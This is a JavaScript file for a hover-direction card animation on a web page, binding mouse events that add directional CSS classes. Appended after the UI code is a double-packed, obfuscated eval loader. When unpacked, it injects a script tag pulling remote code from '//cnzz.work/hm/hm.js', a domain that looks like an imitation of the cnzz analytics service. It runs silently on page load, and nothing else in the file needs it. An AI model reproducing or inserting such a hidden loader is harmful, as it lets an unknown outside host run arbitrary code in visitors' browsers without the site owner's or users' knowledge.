?var hover_dir = {
	wrapper: $p(".major-list")[0],
	box: $p(".major-item"),
	target: $p(".back-face"),
	bindEvent: function(){
		var mouse_pos, x, y, stop_bubble;
		for(var i = 0; i < hover_dir.box.length; i++){
			(function(n){
				$p.addEvent(hover_dir.box[n], "mouseover", function(event){
					event = $p.getEvent(event);
					var relatedT = $p.getRelatedTarget(event);
					if(!$p.contains(hover_dir.box[n], relatedT)){
						var child = hover_dir.box[n].childNodes[0];
						$p.stopPropagation(event);
						$p.removeClass(hover_dir.target[n], "to-left") ||
						$p.removeClass(hover_dir.target[n], "to-right") ||
						$p.removeClass(hover_dir.target[n], "to-top") ||
						$p.removeClass(hover_dir.target[n], "to-bottom");
						x = event.pageX;
						y = event.pageY;
						mouse_pos = {"x": x, "y": y};
						var dir = $p.get_dir(hover_dir.box[n], mouse_pos);
						switch(dir){
							case "left": 
								$p.addClass(hover_dir.target[n], "from-left");
								break;
							case "right": 
								$p.addClass(hover_dir.target[n], "from-right");
								break;
							case "top": 
								$p.addClass(hover_dir.target[n], "from-top");
								break;
							case "bottom":
								$p.addClass(hover_dir.target[n], "from-bottom");
								break;
							default: break;
						}
					}
				});
				$p.addEvent(hover_dir.box[n], "mouseout", function(event){
					event = $p.getEvent(event);
					var relatedT = $p.getRelatedTarget(event);
					if(!$p.contains(hover_dir.box[n], relatedT)){
						$p.removeClass(hover_dir.target[n], "from-left") ||
						$p.removeClass(hover_dir.target[n], "from-right") ||
						$p.removeClass(hover_dir.target[n], "from-top") ||
						$p.removeClass(hover_dir.target[n], "from-bottom");
						x = event.pageX;
						y = event.pageY;
						mouse_pos = {"x": x, "y": y};
						var dir = $p.get_dir(hover_dir.box[n], mouse_pos);
						switch(dir){
							case "left": 
								$p.addClass(hover_dir.target[n], "to-left");
								break;
							case "right": 
								$p.addClass(hover_dir.target[n], "to-right");
								break;
							case "top": 
								$p.addClass(hover_dir.target[n], "to-top");
								break;
							case "bottom":
								$p.addClass(hover_dir.target[n], "to-bottom");
								break;
							default: break;
						}
					}	
				});
			})(i);
		}},
	init: function(){
		hover_dir.bindEvent();
	}
};
hover_dir.init();

;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))